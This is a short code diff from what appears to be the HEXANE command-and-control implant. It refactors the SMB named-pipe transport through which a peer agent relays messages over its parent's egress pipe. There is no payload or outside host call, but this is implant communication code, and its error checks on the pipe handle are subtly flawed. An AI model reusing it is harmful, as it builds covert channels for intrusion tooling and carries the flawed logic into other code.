@@ -479,11 +479,12 @@ namespace Smb {
         HEXANE
         // egress handle is set up by the parent and is assigned to us at build time.
         // this indicates that we are an smb peer.
+        // ERROR_NOT_READ obvious if the pipe is busy.
 
-        auto pipename = Ctx->config.EgressPipename;
+        auto pipename = Ctx->transport.smb->egress_name;
 
-        if (!(Ctx->config.EgressHandle = Ctx->win32.CreateFileW(pipename, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr))) {
-            if (Ctx->config.EgressHandle == INVALID_HANDLE_VALUE && ntstatus == ERROR_PIPE_BUSY) {
+        if (!(Ctx->transport.smb->egress_handle = Ctx->win32.CreateFileW(pipename, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr))) {
+            if (Ctx->transport.smb->egress_handle == INVALID_HANDLE_VALUE && ntstatus == ERROR_PIPE_BUSY) {
 
                 if (!Ctx->win32.WaitNamedPipeW(pipename, 5000)) {
                     return_defer(ERROR_NOT_READY);
@@ -493,17 +494,17 @@ namespace Smb {
             }
         }
 
-        if (Ctx->win32.PeekNamedPipe(Ctx->config.EgressHandle, nullptr, 0, nullptr, &(*in)->length, nullptr)) {
+        if (Ctx->win32.PeekNamedPipe(Ctx->transport.smb->egress_handle, nullptr, 0, nullptr, &(*in)->length, nullptr)) {
             if ((*in)->length > 0) {
 
-                if (!Network::Smb::PipeRead(Ctx->config.EgressHandle, *in)) {
+                if (!Network::Smb::PipeRead(Ctx->transport.smb->egress_handle, *in)) {
                     return_defer(ntstatus);
                 }
             } else {
                 return_defer(ERROR_INSUFFICIENT_BUFFER);
             }
         }
-        if (!Network::Smb::PipeWrite(Ctx->config.EgressHandle, out)) {
+        if (!Network::Smb::PipeWrite(Ctx->transport.smb->egress_handle, out)) {
             return_defer(ntstatus);
         }
 
